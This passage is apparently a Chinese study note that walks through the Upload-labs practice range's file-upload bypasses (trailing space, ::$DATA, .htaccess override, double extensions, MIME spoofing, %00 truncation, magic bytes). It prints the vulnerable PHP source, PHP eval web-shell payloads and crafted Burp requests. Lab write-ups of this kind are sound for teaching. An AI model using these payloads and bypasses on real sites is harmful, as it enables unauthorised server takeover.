        $msg = UPLOAD_PATH . <span style="color: #8b2252;">'&#25991;&#20214;&#22841;&#19981;&#23384;&#22312;,&#35831;&#25163;&#24037;&#21019;&#24314;&#65281;'</span>;
    }
}
</pre>
</div>

<p>
burp suite
</p>
<div class="org-src-container">
<pre class="src src-sh">Content-Disposition: form-data; <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"upload_file"</span>; <span style="color: #a0522d;">filename</span>=<span style="color: #8b2252;">"post.php "</span>
</pre>
</div>

<p>
抓包加空格上传成功
</p>

<p>
在Windows系统中会自动去除文件名最后的空格，因此在Windows系统中可以使用此方法绕过。
</p>
</div>
</div>
<div id="outline-container-h:d8f9bf52-1f9c-4872-ba93-0e24dcb20fd3" class="outline-4">
<h4 id="h:d8f9bf52-1f9c-4872-ba93-0e24dcb20fd3">::$DATA绕过</h4>
<div class="outline-text-4" id="text-h:d8f9bf52-1f9c-4872-ba93-0e24dcb20fd3">
<p>
在Windows中，如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名。使用它的目的就是不检查后缀名，例如：
</p>

<div class="org-src-container">
<pre class="src src-sh">phpinfo.php::$<span style="color: #a0522d;">DATA</span>
</pre>
</div>

<p>
Windows会自动去掉末尾的::$DATA变成 phpinfo.php
Upload-labs（Pass-09）抓包修改文件后缀
</p>

<p>
可以看到，上传成功。但是Linux服务器未去掉后缀，所以解析不了。
</p>
</div>
</div>
<div id="outline-container-h:1e7c30a3-5b3f-4395-a736-b9b7659e9aee" class="outline-4">
<h4 id="h:1e7c30a3-5b3f-4395-a736-b9b7659e9aee">配合解析绕过</h4>
<div class="outline-text-4" id="text-h:1e7c30a3-5b3f-4395-a736-b9b7659e9aee">
<p>
Upload-labs（Pass-10）
</p>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">is_upload</span> = false;
$<span style="color: #a0522d;">msg</span> = null;
<span style="color: #a020f0;">if</span> (isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'submit'</span>])) {
    <span style="color: #a020f0;">if</span> (file_exists(UPLOAD_PATH)) {
        $<span style="color: #a0522d;">deny_ext</span> = array(<span style="color: #8b2252;">".php"</span>,<span style="color: #8b2252;">".php5"</span>,<span style="color: #8b2252;">".php4"</span>,<span style="color: #8b2252;">".php3"</span>,<span style="color: #8b2252;">".php2"</span>,<span style="color: #8b2252;">".html"</span>,<span style="color: #8b2252;">".htm"</span>,<span style="color: #8b2252;">".phtml"</span>,<span style="color: #8b2252;">".pht"</span>,<span style="color: #8b2252;">".pHp"</span>,<span style="color: #8b2252;">".pHp5"</span>,<span style="color: #8b2252;">".pHp4"</span>,<span style="color: #8b2252;">".pHp3"</span>,<span style="color: #8b2252;">".pHp2"</span>,<span style="color: #8b2252;">".Html"</span>,<span style="color: #8b2252;">".Htm"</span>,<span style="color: #8b2252;">".pHtml"</span>,<span style="color: #8b2252;">".jsp"</span>,<span style="color: #8b2252;">".jspa"</span>,<span style="color: #8b2252;">".jspx"</span>,<span style="color: #8b2252;">".jsw"</span>,<span style="color: #8b2252;">".jsv"</span>,<span style="color: #8b2252;">".jspf"</span>,<span style="color: #8b2252;">".jtml"</span>,<span style="color: #8b2252;">".jSp"</span>,<span style="color: #8b2252;">".jSpx"</span>,<span style="color: #8b2252;">".jSpa"</span>,<span style="color: #8b2252;">".jSw"</span>,<span style="color: #8b2252;">".jSv"</span>,<span style="color: #8b2252;">".jSpf"</span>,<span style="color: #8b2252;">".jHtml"</span>,<span style="color: #8b2252;">".asp"</span>,<span style="color: #8b2252;">".aspx"</span>,<span style="color: #8b2252;">".asa"</span>,<span style="color: #8b2252;">".asax"</span>,<span style="color: #8b2252;">".ascx"</span>,<span style="color: #8b2252;">".ashx"</span>,<span style="color: #8b2252;">".asmx"</span>,<span style="color: #8b2252;">".cer"</span>,<span style="color: #8b2252;">".aSp"</span>,<span style="color: #8b2252;">".aSpx"</span>,<span style="color: #8b2252;">".aSa"</span>,<span style="color: #8b2252;">".aSax"</span>,<span style="color: #8b2252;">".aScx"</span>,<span style="color: #8b2252;">".aShx"</span>,<span style="color: #8b2252;">".aSmx"</span>,<span style="color: #8b2252;">".cEr"</span>,<span style="color: #8b2252;">".sWf"</span>,<span style="color: #8b2252;">".swf"</span>,<span style="color: #8b2252;">".htaccess"</span>,<span style="color: #8b2252;">".ini"</span>);
        $<span style="color: #a0522d;">file_name</span> = trim($<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>]);
        $<span style="color: #a0522d;">file_name</span> = deldot($<span style="color: #a0522d;">file_name</span>);//&#21024;&#38500;&#25991;&#20214;&#21517;&#26411;&#23614;&#30340;&#28857;
        $<span style="color: #a0522d;">file_ext</span> = strrchr($<span style="color: #a0522d;">file_name</span>, <span style="color: #8b2252;">'.'</span>);
        $<span style="color: #a0522d;">file_ext</span> = strtolower($<span style="color: #a0522d;">file_ext</span>); //&#36716;&#25442;&#20026;&#23567;&#20889;
        $<span style="color: #a0522d;">file_ext</span> = str_ireplace(<span style="color: #8b2252;">'::$DATA'</span>, <span style="color: #8b2252;">''</span>, $<span style="color: #a0522d;">file_ext</span>);//&#21435;&#38500;&#23383;&#31526;&#20018;::$<span style="color: #a0522d;">DATA</span>
        $<span style="color: #a0522d;">file_ext</span> = trim($<span style="color: #a0522d;">file_ext</span>); //&#39318;&#23614;&#21435;&#31354;

        <span style="color: #a020f0;">if</span> (!in_array($<span style="color: #a0522d;">file_ext</span>, $<span style="color: #a0522d;">deny_ext</span>)) {
            $<span style="color: #a0522d;">temp_file</span> = $<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
            $<span style="color: #a0522d;">img_path</span> = UPLOAD_PATH.<span style="color: #8b2252;">'/'</span>.$<span style="color: #a0522d;">file_name</span>;
            <span style="color: #a020f0;">if</span> (move_uploaded_file($<span style="color: #a0522d;">temp_file</span>, $<span style="color: #a0522d;">img_path</span>)) {
                $<span style="color: #a0522d;">is_upload</span> = true;
            } <span style="color: #a020f0;">else</span> {
                $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">'&#19978;&#20256;&#20986;&#38169;&#65281;'</span>;
            }
        } <span style="color: #a020f0;">else</span> {
            $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">'&#27492;&#25991;&#20214;&#31867;&#22411;&#19981;&#20801;&#35768;&#19978;&#20256;&#65281;'</span>;
        }
    } <span style="color: #a020f0;">else</span> {
        $<span style="color: #a0522d;">msg</span> = UPLOAD_PATH . <span style="color: #8b2252;">'&#25991;&#20214;&#22841;&#19981;&#23384;&#22312;,&#35831;&#25163;&#24037;&#21019;&#24314;&#65281;'</span>;
    }
}
</pre>
</div>

<p>
这一关的思路是它没有循环验证，也就是说这些首尾去空，删除末尾的点，去除字符串:$SDATA，转换为小写这些东西只是验证了一次，所以绕过思路也很简单：在数据包中把后缀名改为 <code>.php. .</code> （两个点之间有个空格）
</p>

<p>
验证过程：首先系统发现最后有一个点，这时会把它去掉，又发现有一个空格，也会把它去掉，这时还有一个点，也就是.php. 由于系统只验证一次，所以不会再去掉剩下的点，这时就可以上传成功。
</p>
</div>
</div>
<div id="outline-container-h:de5e4b0e-bd61-4475-a0d4-14c404bfd686" class="outline-4">
<h4 id="h:de5e4b0e-bd61-4475-a0d4-14c404bfd686">.htaccess文件绕过（√）</h4>
<div class="outline-text-4" id="text-h:de5e4b0e-bd61-4475-a0d4-14c404bfd686">
<p>
在利用.htaccess文件之前，我们先来了解一下什么是.htaccess规则文件。
</p>

<p>
.htaccess文件(或者"分布式配置文件"）全称是Hypertext Access（超文本入口）。
</p>

<p>
提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。
</p>

<div class="org-src-container">
<pre class="src src-sh">htaccess&#25991;&#20214;&#26159;Apache&#26381;&#21153;&#22120;&#20013;&#30340;&#19968;&#20010;&#37197;&#32622;&#25991;&#20214;&#65292;&#23427;&#36127;&#36131;&#30456;&#20851;&#30446;&#24405;&#19979;&#30340;&#32593;&#39029;&#37197;&#32622;&#12290;&#36890;&#36807;htaccess&#25991;&#20214;&#65292;&#21487;
&#20197;&#24110;&#25105;&#20204;&#23454;&#29616;&#65306;
&#32593;&#39029;301&#37325;&#23450;&#21521;&#12289;&#33258;&#23450;&#20041;404&#38169;&#35823;&#39029;&#38754;&#12289;&#25913;&#21464;&#25991;&#20214;&#25193;&#23637;&#21517;&#12289;&#20801;&#35768;/&#38459;&#27490;&#29305;&#23450;&#30340;&#29992;&#25143;&#25110;&#32773;&#30446;&#24405;&#30340;&#35775;&#38382;&#12289;&#31105;&#27490;&#30446;&#24405;&#21015;
&#34920;&#12289;&#37197;&#32622;&#40664;&#35748;&#25991;&#26723;&#31561;&#21151;&#33021;&#12290;&#19978;&#20256;.htaccess&#25991;&#20214;&#65292;&#26469;&#32469;&#36807;&#40657;&#21517;&#21333;&#12290;
&#21069;&#25552;&#26465;&#20214;
1.mod_rewrite&#27169;&#22359;&#24320;&#21551;&#12290;
2.AllowOverride All
</pre>
</div>

<p>
Upload-labs（Pass-04）源码分析，这个比03增加了黑名单量。但是，中间件为Apache的情况下，黑名单未校验htaccess文件，导致可上传htaccess文件，绕过黑名单检测。
</p>


<p>
由于.htaccess还是没有过滤，可以重写文件解析规则绕过，上传一个 .htaccess，文件内容如下，意思
是设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规
范，就会被当作PHP执行，不符合则报错。
</p>


<p>
我们需要先准备好两个文件（ .htaccess 和 xxx.jpg）
</p>

<p>
.htaccess文件
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;FilesMatch <span style="color: #8b2252;">"xxx.jpg"</span>&gt;
Sethandler application/x-httpd-php
&lt;/FilesMatch&gt;
</pre>
</div>

<p>
或
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;IfModule mime_module&gt;
SetHandler application/x-httpd-php
&lt;/IfModule&gt;
</pre>
</div>

<p>
xxx.jpg
</p>
<div class="org-src-container">
<pre class="src src-sh">//xxx.jpg
&lt;?php eval(@$<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">"xxx"</span>]); ?&gt;
</pre>
</div>

<p>
注意： .htaccess文件不能起名字，就是.htaccess文件，如果将其改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。
</p>

<p>
接下来就是先将 .htaccess 文件上传，从而覆盖父目录对上传目录的影响，然后再上传 xxx.jpg 文
件，从而完成 .htaccess 文件上传解析漏洞的利用。
</p>


<p>
用蚁剑成功连接
</p>
</div>
</div>
<div id="outline-container-h:c6197d65-bf18-4851-87c0-5f9d10a1f16b" class="outline-4">
<h4 id="h:c6197d65-bf18-4851-87c0-5f9d10a1f16b">双写后缀名绕过（√）</h4>
<div class="outline-text-4" id="text-h:c6197d65-bf18-4851-87c0-5f9d10a1f16b">
<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">is_upload</span> = false;
$<span style="color: #a0522d;">msg</span> = null;
<span style="color: #a020f0;">if</span> (isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'submit'</span>])) {
    <span style="color: #a020f0;">if</span> (file_exists(UPLOAD_PATH)) {
        $<span style="color: #a0522d;">deny_ext</span> = array(<span style="color: #8b2252;">"php"</span>,<span style="color: #8b2252;">"php5"</span>,<span style="color: #8b2252;">"php4"</span>,<span style="color: #8b2252;">"php3"</span>,<span style="color: #8b2252;">"php2"</span>,<span style="color: #8b2252;">"html"</span>,<span style="color: #8b2252;">"htm"</span>,<span style="color: #8b2252;">"phtml"</span>,<span style="color: #8b2252;">"pht"</span>,<span style="color: #8b2252;">"jsp"</span>,<span style="color: #8b2252;">"jspa"</span>,<span style="color: #8b2252;">"jspx"</span>,<span style="color: #8b2252;">"jsw"</span>,<span style="color: #8b2252;">"jsv"</span>,<span style="color: #8b2252;">"jspf"</span>,<span style="color: #8b2252;">"jtml"</span>,<span style="color: #8b2252;">"asp"</span>,<span style="color: #8b2252;">"aspx"</span>,<span style="color: #8b2252;">"asa"</span>,<span style="color: #8b2252;">"asax"</span>,<span style="color: #8b2252;">"ascx"</span>,<span style="color: #8b2252;">"ashx"</span>,<span style="color: #8b2252;">"asmx"</span>,<span style="color: #8b2252;">"cer"</span>,<span style="color: #8b2252;">"swf"</span>,<span style="color: #8b2252;">"htaccess"</span>,<span style="color: #8b2252;">"ini"</span>);

        $<span style="color: #a0522d;">file_name</span> = trim($<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>]);
        $<span style="color: #a0522d;">file_name</span> = str_ireplace($<span style="color: #a0522d;">deny_ext</span>,<span style="color: #8b2252;">""</span>, $<span style="color: #a0522d;">file_name</span>); // &#21435;&#25481;&#23383;&#31526;
        $<span style="color: #a0522d;">temp_file</span> = $<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
        $<span style="color: #a0522d;">img_path</span> = UPLOAD_PATH.<span style="color: #8b2252;">'/'</span>.$<span style="color: #a0522d;">file_name</span>;        
        <span style="color: #a020f0;">if</span> (move_uploaded_file($<span style="color: #a0522d;">temp_file</span>, $<span style="color: #a0522d;">img_path</span>)) {
            $<span style="color: #a0522d;">is_upload</span> = true;
        } <span style="color: #a020f0;">else</span> {
            $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">'&#19978;&#20256;&#20986;&#38169;&#65281;'</span>;
        }
    } <span style="color: #a020f0;">else</span> {
        $<span style="color: #a0522d;">msg</span> = UPLOAD_PATH . <span style="color: #8b2252;">'&#25991;&#20214;&#22841;&#19981;&#23384;&#22312;,&#35831;&#25163;&#24037;&#21019;&#24314;&#65281;'</span>;
    }
}
</pre>
</div>

<p>
Upload-labs（Pass-11）从源码中可以发现，源码中定义了黑名单列表，我们上传文件的后缀名凡是符合黑名单中任意一个后缀都会被替换为空，那么我们可以利用双写后缀的方式进行绕过。例如：
</p>

<div class="org-src-container">
<pre class="src src-sh">phpinfo.pphphp &#26367;&#25442;&#21518;&#21464;&#25104; phpinfo.php
</pre>
</div>

<p>
访问文件，可以成功解析
</p>
</div>
</div>
<div id="outline-container-h:107d8bf7-e12a-4221-8781-08b0183cc27a" class="outline-4">
<h4 id="h:107d8bf7-e12a-4221-8781-08b0183cc27a">小结</h4>
<div class="outline-text-4" id="text-h:107d8bf7-e12a-4221-8781-08b0183cc27a">
<p>
不知道服务端用的什么逻辑，只能一个个去试，8种方法练熟，实际操作时很快的。
</p>
</div>
</div>
</div>
<div id="outline-container-h:d45862ce-c977-41e0-b938-ad4251cadd9b" class="outline-3">
<h3 id="h:d45862ce-c977-41e0-b938-ad4251cadd9b">服务端白名单绕过</h3>
<div class="outline-text-3" id="text-h:d45862ce-c977-41e0-b938-ad4251cadd9b">
</div>
<div id="outline-container-h:cf7b43b9-b596-4f55-8b4f-9703d8fe8e45" class="outline-4">
<h4 id="h:cf7b43b9-b596-4f55-8b4f-9703d8fe8e45">MIME类型检测绕过（√）</h4>
<div class="outline-text-4" id="text-h:cf7b43b9-b596-4f55-8b4f-9703d8fe8e45">
<p>
Upload-labs（Pass-02）第二关通过服务端对数据包的MIME进行检查
通过burp修改Content-Type类型，如 Content-Type: image/jpeg
</p>



<figure id="orgade14cd">
<img src="./images/img_20230707_172604.png" alt="img_20230707_172604.png" width="50%">

</figure>


<p>
上传成功
</p>
</div>
</div>
<div id="outline-container-h:cb66df48-ff85-4d87-8922-58455854cb23" class="outline-4">
<h4 id="h:cb66df48-ff85-4d87-8922-58455854cb23">%00截断绕过（√）</h4>
<div class="outline-text-4" id="text-h:cb66df48-ff85-4d87-8922-58455854cb23">
<p>
%00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0（%00或者00）字符的方式，达到字符串截断的目的。
</p>

<div class="org-src-container">
<pre class="src src-sh">\0 &#26159;ASCII&#30721;&#34920;&#20013;&#31532;0&#20010;&#23383;&#31526;&#65292;&#21363;ASCII&#30721;&#20026;0&#30340;&#23383;&#31526;&#65292;&#33521;&#25991;&#31216;&#20026;NUL&#65292;&#20013;&#25991;&#31216;&#20026;<span style="color: #8b2252;">"&#31354;&#23383;&#31526;"</span>
</pre>
</div>

<p>
需要注意的是：\0是用户的输入经过层层解析后在系统底层的表现形式，因此用户在前端输入的时候是不能直接使用 \0 的，通常会使用 %00 或者 0x00
</p>

<ul class="org-ul">
<li>%00：在URL中%00表示ASCll码中的0，而0作为特殊字符保留，表示字符结束。当URL中出现%00时就认为读取已结束，而忽略后面上传的文件或者图片，只上传截断前的文件。</li>
<li>0x00：操作系统按照十六进制读取文件内容，遇到ASCII码为0的字符就会停止。而ASCII码为0的字符在十六进制中就是 00，用 0x 开头表示 16 进制，也就形成了 0x00 截断。</li>
<li>0x00 是 %00 解码成的十六进制形式，无需关注具体转换过程。</li>
</ul>

<p>
%00举例：
</p>

<pre class="example" id="org64ecfae">
http://www.XXX.com/upload/aaa.php%00bbb.jpg
</pre>

<p>
由于%00有截断功能，服务器在接收的时候，就直接对URL编码（即%00）进行解码，然后再去接收文件，这时候后面的bbb.jpg被截断掉，文件名就变成了aaa.php，所以最后服务器接收到的文件名是aaa.php。
</p>


<p>
截断原理：
利用%00是字符串结束标识符的机制，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过前端的检测。
</p>

<p>
%00截断通常用来绕过Web的白名单限制。Upload-labs（Pass-12）看代码可以得知是一个白名单，只允许上传'jpg','png','gif'格式的文件，但是上传路径是可以控制的，可以使用%00进行截断。
</p>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">is_upload</span> = false;
$<span style="color: #a0522d;">msg</span> = null;
<span style="color: #a020f0;">if</span>(isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'submit'</span>])){
    $<span style="color: #a0522d;">ext_arr</span> = array(<span style="color: #8b2252;">'jpg'</span>,<span style="color: #8b2252;">'png'</span>,<span style="color: #8b2252;">'gif'</span>);
    $<span style="color: #a0522d;">file_ext</span> = substr($<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>],strrpos($<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>],<span style="color: #8b2252;">"."</span>)+1);
    <span style="color: #a020f0;">if</span>(in_array($<span style="color: #a0522d;">file_ext</span>,$<span style="color: #a0522d;">ext_arr</span>)){
        $<span style="color: #a0522d;">temp_file</span> = $<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
        $<span style="color: #a0522d;">img_path</span> = $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'save_path'</span>].<span style="color: #8b2252;">"/"</span>.rand(10, 99).date(<span style="color: #8b2252;">"YmdHis"</span>)<span style="color: #483d8b;">.</span><span style="color: #8b2252;">"."</span>.$<span style="color: #a0522d;">file_ext</span>;

        <span style="color: #a020f0;">if</span>(move_uploaded_file($<span style="color: #a0522d;">temp_file</span>,$<span style="color: #a0522d;">img_path</span>)){
            $<span style="color: #a0522d;">is_upload</span> = true;
        } <span style="color: #a020f0;">else</span> {
            $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">'&#19978;&#20256;&#20986;&#38169;&#65281;'</span>;
        }
    } <span style="color: #a020f0;">else</span>{
        $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">"&#21482;&#20801;&#35768;&#19978;&#20256;.jpg|.png|.gif&#31867;&#22411;&#25991;&#20214;&#65281;"</span>;
    }
}
</pre>
</div>

<p>
我们可以看到 %00 截断是放到 GET 方法中，可以直接在浏览器url上自动解码
</p>
<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">img_path</span> = $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'save_path'</span>].<span style="color: #8b2252;">"/"</span>.rand(10, 99).date(<span style="color: #8b2252;">"YmdHis"</span>)<span style="color: #483d8b;">.</span><span style="color: #8b2252;">"."</span>.$<span style="color: #a0522d;">file_ext</span>;
</pre>
</div>

<p>
如果是 POST 访问，就需要提交抓包时解码一下 %00
</p>
<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">img_path</span> = $<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'save_path'</span>].<span style="color: #8b2252;">"/"</span>.rand(10, 99).date(<span style="color: #8b2252;">"YmdHis"</span>)<span style="color: #483d8b;">.</span><span style="color: #8b2252;">"."</span>.$<span style="color: #a0522d;">file_ext</span>;
</pre>
</div>


<p>
截断条件：
1、php版本小于5.3.4
2、php.ini的magic_quotes_gpc为OFF状态
</p>

<p>
这里 docker 搭的靶场不适用，我们使用 windows 版的 PhpStudy2018 。网上下载个 upload-labs
在Windows系统中搭建环境，选择php版本为5.2，打开php.ini 文件，找到其它选项菜单，设置magic_quotes_gpc = OFF
</p>

<p>
为什么不是最新版本的 phpstudy ？因为最新版本 phpstudy 无法安装php5.2.17
</p>

<p>
我这里使用了docker方式
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">upload-labs &#20462;&#25913;&#26435;&#38480;</span>
chmod -R 777 code/upload-labs

<span style="color: #b22222;">#</span><span style="color: #b22222;">https://github.com/liugan0954/docker-php5.2.17/</span>
docker run -d --privileged --name php-5.2.17 -p 8085:8080  -v ./code:/data/web/example.com fifilyu/docker-php-5.2.17-fpm:latest

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25226;upload-labs&#25918;&#21040;code&#30446;&#24405;&#23601;&#34892;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">00&#25130;&#26029;&#22312;Pass-11&#20013;</span>
</pre>
</div>



<p>
之后进行文件上传，burp suite 抓包：
</p>
<ul class="org-ul">
<li>修改PHP文件后缀为png</li>
<li>save_path 后增加文件名 a.php%00</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">POST /upload-labs/Pass-11/index.php?<span style="color: #a0522d;">save_path</span>=../upload/a.php%00 HTTP/1.1
... &#30053;

-----------------------------227334169839912571603417622282
Content-Disposition: form-data; <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"upload_file"</span>; <span style="color: #a0522d;">filename</span>=<span style="color: #8b2252;">"test.png"</span>
Content-Type: image/png

&lt;?php eval(@$<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'a'</span>]);?&gt;

... &#30053;
</pre>
</div>

<p>
这里%00截断，要上传的文件不要了，而是用我们拼接好的路径。
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#19978;&#20256;&#23436;&#24471;&#21040;&#36335;&#24452;&#65306;</span>
http://124.222.171.19:8085/upload-labs/upload/a.php%EF%BF%BD/8520230711010618.png

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25105;&#20204;&#21482;&#38656;&#35201;&#35775;&#38382;a.php&#23601;&#34892;&#65292;&#28779;&#29392;&#27983;&#35272;&#22120;hackbar&#35775;&#38382;&#39564;&#35777;</span>
</pre>
</div>




<figure id="orge8f55a8">
<img src="./images/img_20230711_091315.png" alt="img_20230711_091315.png" width="50%">

</figure>


<p>
使用蚁剑连接成功
</p>


<figure id="orgde807fa">
<img src="./images/img_20230711_091500.png" alt="img_20230711_091500.png" width="50%">

</figure>



<figure id="org133b759">
<img src="./images/img_20230711_091531.png" alt="img_20230711_091531.png" width="50%">

</figure>


<p>
注意：
%00的使用是在路径上！
%00的使用是在路径上！
%00的使用是在路径上！
重要的话说三遍。如果在文件名上使用，就无法正常截断了。
%00只能用在路径上，这个路径可能在post数据包中，也可能在URL中，所以在这些地方使用%00进行截断处理，这样服务器在对文件名进行检测之后，就会把路径跟文件名拼接在一起，这时候%00就开始
发挥作用了。
</p>
</div>
</div>
</div>
<div id="outline-container-h:4882636f-b217-4f85-a096-c6a882629949" class="outline-3">
<h3 id="h:4882636f-b217-4f85-a096-c6a882629949">服务端内容检查绕过</h3>
<div class="outline-text-3" id="text-h:4882636f-b217-4f85-a096-c6a882629949">
</div>
<div id="outline-container-h:d0bdff44-8482-44fc-ab56-70633ec3fb4e" class="outline-4">
<h4 id="h:d0bdff44-8482-44fc-ab56-70633ec3fb4e">文件头检查（√）</h4>
<div class="outline-text-4" id="text-h:d0bdff44-8482-44fc-ab56-70633ec3fb4e">
<p>
Upload-labs（Pass-14）
</p>

<p>
注意：下面的文件头的格式是16进制的格式
</p>
<div class="org-src-container">
<pre class="src src-sh">.jpg FF D8 FF E0 00 10 4A 46 49 46
.gif 47 49 46 38 39 61&#65292;&#23383;&#31526;&#20018;: GIF89(7)a
.png 89 50 4E 47
&#21387;&#32553;&#21253;&#25991;&#20214;&#65306;50 4B 03 04
BMP: 42 4D&#65292;&#23383;&#31526;&#20018;: BM
</pre>
</div>

<p>
16进制工具：
</p>
<ul class="org-ul">
<li>Mac版 <a href="https://hexfiend.com/">hexfiend</a> 下载地址：<a href="https://github.com/HexFiend/HexFiend/releases">https://github.com/HexFiend/HexFiend/releases</a></li>
<li>Windows下可使用 010 editor。</li>
<li>命令行查看 hexdump -C ctfhub.png</li>
</ul>

<p>
随便打开两张PNG的图片看下，在文件的头部都会有其专有的字符。标注出来的就是png图片的文件头，题目检查的也就是这个，可以在 burp 里直接加，也可以通过图片马直接上传然后getshell。
</p>


<figure id="org0fde29b">
<img src="./images/img_20230711_141732.png" alt="img_20230711_141732.png" width="50%">

</figure>

<p>
白名单进行的文件头检测，符合，则允许上传，否则不允许上传。
</p>

<p>
检查图标内容开头2个字节，使用图片马进行上传获取webshell，最后使用文件包含漏洞进行利用
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a020f0;">function</span> <span style="color: #0000ff;">getReailFileType</span>($<span style="color: #a0522d;">filename</span>){
    $<span style="color: #a0522d;">file</span> = fopen($<span style="color: #a0522d;">filename</span>, <span style="color: #8b2252;">"rb"</span>);
    $<span style="color: #a0522d;">bin</span> = fread($<span style="color: #a0522d;">file</span>, 2); //&#21482;&#35835;2&#23383;&#33410;
    fclose($<span style="color: #a0522d;">file</span>);
    $<span style="color: #a0522d;">strInfo</span> = @unpack(<span style="color: #8b2252;">"C2chars"</span>, $<span style="color: #a0522d;">bin</span>);    
    $<span style="color: #a0522d;">typeCode</span> = intval($<span style="color: #a0522d;">strInfo</span>[<span style="color: #8b2252;">'chars1'</span>].$<span style="color: #a0522d;">strInfo</span>[<span style="color: #8b2252;">'chars2'</span>]);    
    $<span style="color: #a0522d;">fileType</span> = <span style="color: #8b2252;">''</span>;    
    switch($<span style="color: #a0522d;">typeCode</span>){      
        <span style="color: #a020f0;">case</span> 255216:            
            $<span style="color: #a0522d;">fileType</span> = <span style="color: #8b2252;">'jpg'</span>;
            <span style="color: #a020f0;">break</span>;
        <span style="color: #a020f0;">case</span> 13780:            
            $<span style="color: #a0522d;">fileType</span> = <span style="color: #8b2252;">'png'</span>;
            <span style="color: #a020f0;">break</span>;        
        <span style="color: #a020f0;">case</span> 7173:            
            $<span style="color: #a0522d;">fileType</span> = <span style="color: #8b2252;">'gif'</span>;
            <span style="color: #a020f0;">break</span>;
        default:            
            $<span style="color: #a0522d;">fileType</span> = <span style="color: #8b2252;">'unknown'</span>;
        }    
        <span style="color: #a020f0;">return</span> $<span style="color: #a0522d;">fileType</span>;
}

$<span style="color: #a0522d;">is_upload</span> = false;
$<span style="color: #a0522d;">msg</span> = null;
<span style="color: #a020f0;">if</span>(isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'submit'</span>])){
    $<span style="color: #a0522d;">temp_file</span> = $<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
    $<span style="color: #a0522d;">file_type</span> = getReailFileType($<span style="color: #a0522d;">temp_file</span>);

    <span style="color: #a020f0;">if</span>($<span style="color: #a0522d;">file_type</span> == <span style="color: #8b2252;">'unknown'</span>){
        $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">"&#25991;&#20214;&#26410;&#30693;&#65292;&#19978;&#20256;&#22833;&#36133;&#65281;"</span>;
    }<span style="color: #a020f0;">else</span>{
        $<span style="color: #a0522d;">img_path</span> = UPLOAD_PATH.<span style="color: #8b2252;">"/"</span>.rand(10, 99).date(<span style="color: #8b2252;">"YmdHis"</span>)<span style="color: #483d8b;">.</span><span style="color: #8b2252;">"."</span>.$<span style="color: #a0522d;">file_type</span>;
        <span style="color: #a020f0;">if</span>(move_uploaded_file($<span style="color: #a0522d;">temp_file</span>,$<span style="color: #a0522d;">img_path</span>)){
            $<span style="color: #a0522d;">is_upload</span> = true;
        } <span style="color: #a020f0;">else</span> {
            $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">"&#19978;&#20256;&#20986;&#38169;&#65281;"</span>;
        }
    }
}
</pre>
</div>

<p>
这里直接给出了文件包含漏洞的环境，所以我们上传一张图片马即可
</p>
</div>
<div id="outline-container-h:46bbb15a-e84a-41c3-aa82-4d630b9aa97a" class="outline-5">
